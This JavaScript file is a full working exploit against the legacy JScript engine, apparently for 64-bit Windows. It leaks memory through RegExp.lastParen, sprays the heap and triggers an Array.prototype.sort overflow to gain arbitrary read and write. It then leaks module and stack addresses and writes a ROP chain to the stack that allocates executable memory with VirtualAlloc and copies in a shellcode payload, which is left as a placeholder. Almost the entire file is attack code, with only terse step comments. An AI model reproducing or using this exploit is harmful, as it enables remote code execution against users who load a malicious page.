

function breakpoint(msg) {
	//Math.atan(msg);
	Math.acos(msg);
}

function print64(qw){
	return "qw: "+ qw.dwh.toString(16) + qw.dwl.toString(16);
}




///////////////////////////////////////////////////////////
//	    				  UTILS 	    				 //
///////////////////////////////////////////////////////////

function alloc_string(size, b) {
	var nChars = size/2;
	var r = nChars%b.length;
	var s1 = Array((nChars-r)/b.length + 1).join(b);
	var s2 = b.substr(0,r);
	return  s1+s2;
}

function read_dword(leak, offset) {
	var dw = 0;
	dw +=  leak.charCodeAt(offset);
	dw +=  leak.charCodeAt(offset+1) << 16;
	return dw;
}

function dwordToUnicode(array) {
	var s = "";	
	for (var i=0; i<array.length; i++) {
		s += String.fromCharCode(array[i] & 0xFFFF, array[i] >> 16);
	}
	return s;
}

function qwToDoubleIEEE754(qw) {
	var dwh = qw.dwh;
	var dwl = qw.dwl;
	var sign = 1.0;		
	if (dwh&0x80000000) {
		sign = -1.0;
	}
	var exponent = (dwh>>20 & 0x7ff);
	var mantissa;
	if (exponent) {
		exponent = Math.pow(2, (dwh>>20 & 0x7ff) - 1023);
		mantissa = (dwh&0xfffff | 0x100000)*1.0/Math.pow(2, 20)  + dwl*1.0/Math.pow(2, 52);
	} else {
		exponent = Math.pow(2, -1022);
		mantissa = (dwh&0xfffff)*1.0/Math.pow(2, 20)  + dwl*1.0/Math.pow(2, 52);
	}
	return sign*exponent*mantissa;
}

function add64(qw, value) {
	var h = qw.dwh;
	var l = qw.dwl+value;
	if (l >= 0x100000000) {
		l = l&0xffffffff;
		h = h+1;/////
	}
	return {dwh:h, dwl:l};
}

function sub64(qw, value) {
	var h = qw.dwh;
	var l = qw.dwl;

	if (l < value) {
		h = h-1;/////
		l = (0x100000000+l) - value;
	} else {
		l = l - value;
	}
	return {dwh:h, dwl:l};
}


var namesLen = 700;
var names = Array(namesLen);
for (var i=0; i<namesLen; i++) {
	names[i] = alloc_string(0x50, i+"_NAME");
}
var var1 = names[276]; var var1Hash = 0xdb51098b; var var1Offset = 0x10+0x98*0;
var var2 = names[184]; var var2Hash = 0x113c6a11; var var2Offset = 0x10+0x98*1;
var var3 = names[254]; var var3Hash = 0xbb28f497; var var3Offset = 0x10+0x98*2;
var var4 = names[162]; var var4Hash = 0xf114551d; var var4Offset = 0x10+0x98*3;
var var5 = names[232]; var var5Hash = 0x9b00dfa3; var var5Offset = 0x10+0x98*4;
var var6 = names[140]; var var6Hash = 0xd0ec4029; var var6Offset = 0x10+0x98*5;


var mObj;
var fakeVARObjsAddr;
function readDW(qw) {
	mObj[var2] = mObj[var3]; 
	mObj[var1] = qwToDoubleIEEE754(add64(qw, 4));
	mObj[var2] = mObj[var4];
	var highBits = mObj[var1].length*2;

	mObj[var2] = mObj[var3];
	mObj[var1] = qwToDoubleIEEE754(add64(qw, 3));
	mObj[var2] = mObj[var4];
	var lowBit = (mObj[var1].length&0x80)>>7;

	return highBits+lowBit;
}

function readQW(qw) {
	var l = readDW(qw);
	var h = readDW(add64(qw, 4));
	return {dwh:h, dwl:l};
}

function writeQW(qwAddr, qwValue) {
	mObj[var2] = mObj[var3];
	mObj[var1] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var6Offset+8));
	mObj[var2] = mObj[var5];
	mObj[var1] = qwToDoubleIEEE754(qwValue);

	mObj[var2] = mObj[var3];
	mObj[var1] = qwToDoubleIEEE754(sub64(qwAddr, 0x10));
	mObj[var2] = mObj[var5];
	mObj[var1] = mObj[var6];
}


///////////////////////////////////////////////////////////
//	    				 STAGE 1	    				 //
///////////////////////////////////////////////////////////

// Heap Spraying with strings
var arrayStringsLen = 0x100;
var arrayStrings = new Array(arrayStringsLen);
for (var i=0; i<arrayStringsLen; i++) {
	arrayStrings[i] = alloc_string(0x5000-0x18 -0x4, "A");
}
for (var i=1; i<arrayStringsLen; i+=2) {
	arrayStrings[i] = null;
	CollectGarbage();
}


// Triggering the infoleak
var re = new RegExp(Array(0x2A).join('()'));
var target_str = arrayStrings[arrayStringsLen-4];
target_str.search(re);
RegExp.input = 0x6000/2;
var leak = RegExp.lastParen;


// Finding the leaked object address
var offset = 0;
while(read_dword(leak, offset)) {
	offset += 2;
}
offset = offset + 0x14/2; //pq son caracteres unicode
var objAddr = {dwh:read_dword(leak, offset+4/2), dwl:read_dword(leak, offset)};
fakeVARObjsAddr = add64(objAddr, 8);


// Making the data that will be loaded at the leaked address
var payload = unescape("PAYLOAD");
var arrayFOLen = 0x100;
var arrayFO = new Array(arrayFOLen);
var ptrToObject2 = add64(fakeVARObjsAddr, 0xA0);
var fakeVariables =	
// Filler bytes
dwordToUnicode([0x00000000, 0x00000000, 0x00000000, 0x00000000])+
// Fake linked-list of objects pointed by a hashtable:
	//Object 1:
    dwordToUnicode([
	0x00000003, 0x00000000, 0x0000C0FE, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 
	var1Hash,   0x00000050,	0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var1 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 2:
	dwordToUnicode([
	0x0000400C, 0x00000000, fakeVARObjsAddr.dwl, fakeVARObjsAddr.dwh, 0x00000000, 0x00000000, 
	0x00000000, 0x00000000, var2Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 
	0x00000000, 0x00000000]) + var2 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 3:
	dwordToUnicode([
	0x00000003, 0x00000000,	0x00000000, 0x00000000, 0x00000005, 0x00000000, 0x00000000, 0x00000000, 
	var3Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var3 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 4:
	dwordToUnicode([
	0x00000003, 0x00000000,	0x00000000, 0x00000000, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 
	var4Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var4 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 5:
	dwordToUnicode([
	0x00000003, 0x00000000, 0x00000000, 0x00000000, 0x0000400C, 0x00000000, 0x00000000, 0x00000000, 
	var5Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var5 + dwordToUnicode([0x00000000, 0x00000000])+
	//Object 6:
	dwordToUnicode([
	0x00000003, 0x00000000,	0x00000000, 0x00000000,	0x00000000, 0x00000000,	0x00000000, 0x00000000,
	var6Hash, 0x00000050, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]) 
    + var6 + dwordToUnicode([0x00000000, 0x00000000])+

	// Space to leak data
	dwordToUnicode([0x41414141, 0x41414141,	0x41414141, 0x41414141,	0x41414141, 0x41414141])+

	// Payload
    payload
;
var spaceToLeakAddr = add64(fakeVARObjsAddr, 0x10+0x98*6);
var payloadAddr = add64(fakeVARObjsAddr, 0x10+0x98*6+0x18);


// Filling the leaked-address hole
var ss = alloc_string(0x5000-0x18 -0x4, fakeVariables);
for (var i=0; i<arrayFOLen; i++) {
	arrayFO[i] = Array(2).join(ss);
}

breakpoint("[x] STAGE 1: Done!");




///////////////////////////////////////////////////////////
//	    				 STAGE 2	    				 //
///////////////////////////////////////////////////////////

// Heap Spraying - LFH with HashTables
var nBlocks = 0x300;
var iniFreeBlocks = 0x80;
var nFreeBlocks = 0x280;
var objshs = Array(nBlocks);
for (var ii=0; ii<nBlocks; ii++){
    var o = new Object();
	for (var i=0; i<300; i++) {
        o[names[i]] = i;     
    }
    objshs[ii] = o;
}
Array.prototype.sort.call(objshs);
for (var ii=iniFreeBlocks; ii<iniFreeBlocks+nFreeBlocks; ii+=2){
	for (var i=300; i<namesLen; i++) {
		objshs[ii][names[i]] = i;
	}
	CollectGarbage();
}
breakpoint("[x] HeapSpray done!");


// Filling some potential holes
var nBlockspf = 0x80;
var objspf = Array(nBlockspf);
for (var ii=0; ii<nBlockspf; ii++){
	var o = new Object();
	for (var i=0; i<300; i++) {
		o[i] = i;
	}
	objspf[ii] = o;
}
Array.prototype.sort.call(objspf);
breakpoint("[x] preFill done!");


// Defining the function exploit() called inside the last callback that triggers the overflow
var arrayExLen = 0x20;
var arrayExMidPoint = 0x15;
var arrayEx = new Array(arrayExLen);
function exploit() {
    // Constructing the object to trigger the overflow
	for (var i=0; i<arrayExMidPoint-1; i++) {
		arrayEx[i] = i;
	}
	var obj = {toString:function() {
		arrayEx[arrayExMidPoint+1] = 0;
		arrayEx[arrayExMidPoint+2] = 0;
		arrayEx[arrayExMidPoint+3] = 0;
		arrayEx[arrayExMidPoint+4] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var1Offset));
		arrayEx[arrayExMidPoint+5] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var2Offset));
		arrayEx[arrayExMidPoint+6] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var3Offset));
		arrayEx[arrayExMidPoint+7] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var4Offset));
		arrayEx[arrayExMidPoint+8] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var5Offset));
		arrayEx[arrayExMidPoint+9] = qwToDoubleIEEE754(add64(fakeVARObjsAddr, var6Offset));
	}}
	arrayEx[0] = obj;


    // Triggering the overflow
    breakpoint("[x] Triggering Overflow!");
	Array.prototype.sort.call(arrayEx);


	// Finding the overflowed hashtable
    breakpoint("[x] Finding the overflown HashTable!");
	for (var ii=iniFreeBlocks+1; ii<iniFreeBlocks+nFreeBlocks; ii+=2){
		if (objshs[ii][var1] == 0xC0FE) {
			mObj = objshs[ii];
		}
	}
	breakpoint("[x] Found!! MagicNumber: 0x" + mObj[var1].toString(16));






//////////////////////////////////////
    // Fixing overflowed heap
	mObj[var6] = mObj;
	var v = readQW(add64(fakeVARObjsAddr, 0x10+0x98*5 + 0x08));
	var nameTbl = readQW(add64(v, 0x08));
breakpoint("nameTbl: " + print64(nameTbl));
	var nameList = readQW(add64(nameTbl, 0x10));

	var ht1 = sub64(readQW(add64(nameList, 0x38)), 0x10);
breakpoint("ht1: " + print64(ht1));
	var key2 = readQW(add64(ht1, 0x410 + 0x08));

	var keyL = ((ht1.dwl^(ht1.dwl+0x410))>>4)^key2.dwl;
	var keyH = 0x90000000 + (key2.dwh&0xFF);
	var oldKey = {dwh:keyH, dwl:keyL};

	writeQW(add64(ht1, 0x08), oldKey);

    // Leaking stack pointer
	var stackPtr = readQW(add64(readQW(add64(nameTbl, 0x18)), 0x50));
breakpoint("stackPtr: " + print64(stackPtr));
	//stackPtr = add64(stackPtr, 0x3A88);
	breakpoint("stackPtr+offset: " + print64(stackPtr));




//////////////////////////////////////


	// Leaking jscript Address
	mObj[var2] = mObj[var3];
	mObj[var1] = qwToDoubleIEEE754(spaceToLeakAddr);
	mObj[var2] = mObj[var5];
	mObj[var1] = new Array(1);
	jscript = sub64(readQW(add64(spaceToLeakAddr, 0x10)), 0x24134);
	breakpoint("[x] jscript addr: " + print64(jscript));

//////////////////////////////////////

    // Finding ret address = jscript!ConvertToString+0x5b
    var retValue = add64(jscript, 0xcd23);
breakpoint("[x] retValue: " + print64(retValue));


    function equal64(qw1, qw2) {
        return qw1.dwh==qw2.dwh && qw1.dwl==qw2.dwl;
    }

    // Fixing stack pointer so it points to the previous ret address
    tmp = readQW(stackPtr);
    while (!equal64(tmp, retValue)) {
        stackPtr = add64(stackPtr, 0x08);
        tmp = readQW(stackPtr);
    }
breakpoint("[x] retValue found at: " + print64(stackPtr));    

//////////////////////////////////////


    // Leaking VirtualAlloc and memcpy addresses
	var kernel32 = sub64(readQW(add64(jscript, 0xb33b0)), 0x15b00);
	var memcpy = readQW(add64(jscript, 0xb3268)); 
	var virtualAlloc = add64(kernel32, 0x15C68);









    breakpoint("[x] ROP");
    // Loading ROP directly into the stack
    // Overwriting a return address that triggers the execution of the ROP chain
	writeQW(add64(stackPtr, 0x198), add64(jscript, 0x44C15));   // # JMP RBX
	writeQW(add64(stackPtr, 0x168), add64(jscript, 0x9595));	// # ADD RSP,20 # POP RBX # RETN
	writeQW(add64(stackPtr, 0x160), add64(jscript, 0x44C15));   // # JMP RBX
	writeQW(add64(stackPtr, 0x158), memcpy);                    // RBX = memcpy
	writeQW(add64(stackPtr, 0x150), add64(jscript, 0x86014));	// # MOV R8, RBP # MOV RDX, R14 # CALL [RAX+18]
	writeQW(add64(stackPtr, 0x148), add64(stackPtr, 0x30 - 0x18)); // RAX = 
	writeQW(add64(stackPtr, 0x140), add64(jscript, 0xC1D0));	// # POP RAX # RETN
	writeQW(add64(stackPtr, 0x138), add64(jscript, 0x1532));    // # MOV [RAX+8], RCX # RET
	writeQW(add64(stackPtr, 0x130), add64(stackPtr, 0x190 - 8)); // RAX -> Saving RWX_Memory_Address into the stack = memdst
	writeQW(add64(stackPtr, 0x128), add64(jscript, 0xC1D0));	// # POP RAX # RETN
	writeQW(add64(stackPtr, 0x120), add64(jscript, 0x3BAAF));	// # MOV RCX, RAX # CALL R9
	writeQW(add64(stackPtr, 0x118), {dwh:0, dwl:0x2000});       // RBP = R8 = size = 0x2000
	writeQW(add64(stackPtr, 0x110), payloadAddr);               // R14 = RDX = memsrc = payloadAddr
	writeQW(add64(stackPtr, 0x108), add64(jscript, 0x54DD));    // # MOV R9, RBX # ... # CALL [RDI+80]
	writeQW(add64(stackPtr, 0x100), add64(jscript, 0x6E9FA));   // RBX = R9 -> # POP RSI # RETN
	writeQW(add64(stackPtr,  0xF8), add64(jscript, 0x6E9FA));   // RSI = 
	writeQW(add64(stackPtr,  0xF0), add64(jscript, 0x5A697));   // # POP RSI # POP RBX # RETN
	writeQW(add64(stackPtr,  0xE8), add64(stackPtr, 0x40 - 0x80)); // RDI = 
	writeQW(add64(stackPtr,  0xC0), add64(jscript, 0xF0BA));	// # ADD RSP,20 # POP RDI # RETN
	writeQW(add64(stackPtr,  0xB8), add64(jscript, 0x44C15));   // # JMP RBX
	writeQW(add64(stackPtr,  0xB0), virtualAlloc);              // RBX = VirtualAlloc
	writeQW(add64(stackPtr,  0xA8), add64(jscript, 0x9AF4));	// # MOV RCX, RBX # CALL RSI
	writeQW(add64(stackPtr,  0xA0), add64(jscript, 0x5A697));   // RSI -> # POP RSI # POP RBX # RETN
	writeQW(add64(stackPtr,  0x98), add64(jscript, 0x73121));   // # XOR EBX, EBX # CALL [RAX]
	writeQW(add64(stackPtr,  0x90), add64(stackPtr, 0x38)); // RAX =
	writeQW(add64(stackPtr,  0x88), add64(jscript, 0xC1D0));	// # POP RAX # RETN
	writeQW(add64(stackPtr,  0x80), {dwh:0, dwl:0x1000});       // RBX = 
	writeQW(add64(stackPtr,  0x78), add64(jscript, 0x86011));	// # MOV R9, RDI # MOV R8, RBP # MOV RDX, R14 # CALL [RAX+18]
	writeQW(add64(stackPtr,  0x70), add64(stackPtr, 0x30 - 0x18)); // RAX = 
	writeQW(add64(stackPtr,  0x68), add64(jscript, 0xC1D0));	// # POP RAX # RETN
	writeQW(add64(stackPtr,  0x60), {dwh:0, dwl:0x3000});       // RBP = R8 = 0x3000 = flAllocationType = MEM_COMMIT | MEM_RESERVE
	writeQW(add64(stackPtr,  0x58), {dwh:0, dwl:0x4000});       // R14 = RDX = 0x4000 = dwSize
	writeQW(add64(stackPtr,  0x50), add64(jscript, 0x7F69));	// # POP R14 # POP RBP # RETN
	writeQW(add64(stackPtr,  0x48), {dwh:0, dwl:0x40});         // RDI = R9 = 0x40 = flProtect = PAGE_EXECUTE_READWRITE
	writeQW(add64(stackPtr,  0x00), add64(jscript, 0x5BACE));	// # ADD RSP, 40 # POP RDI # RETN

	writeQW(add64(stackPtr,  0x40), add64(jscript, 0x7F67));	// Value for the CALL[RDI+80] -> # POP R15 # POP R14 # POP RBP # RETN
	writeQW(add64(stackPtr,  0x38), add64(jscript, 0x6E9F9));	// Value for the CALL[RAX] -> # POP RDI # POP RSI # RETN
	writeQW(add64(stackPtr,  0x30), add64(jscript, 0x5A697));	// Value for the CALL[RAX+18] -> # POP RSI # POP RBX # RETN

    breakpoint("[x] End Exploit");
}




// Chaining some similar execution flows prior to the overflow to increase the odds
var nCount = 0x20;
var objsfh = Array(nCount);
for (var k=0; k<nCount; k++){
	var array = new Array(arrayExLen);
	for (var i=0; i<arrayExMidPoint-1; i++) {
		array[i] = i;
	}
	objsfh[k] = array;
}
for (var k=0; k<nCount-1; k++){
	var o = new Object();
	o.index = k;
	o.toString = function() {
		Array.prototype.sort.call(objsfh[this.index+1]);
	};

	objsfh[k][0] = o;
}	
var o = new Object();
o.toString = function() {
    // Last callback that executes exploit()
	exploit();
};
objsfh[nCount-1][0] = o;

// Triggering the nested calls 
Array.prototype.sort.call(objsfh[0]);



/////
while(true) {
CollectGarbage();
}
Array.prototype.sort.call(objshs);




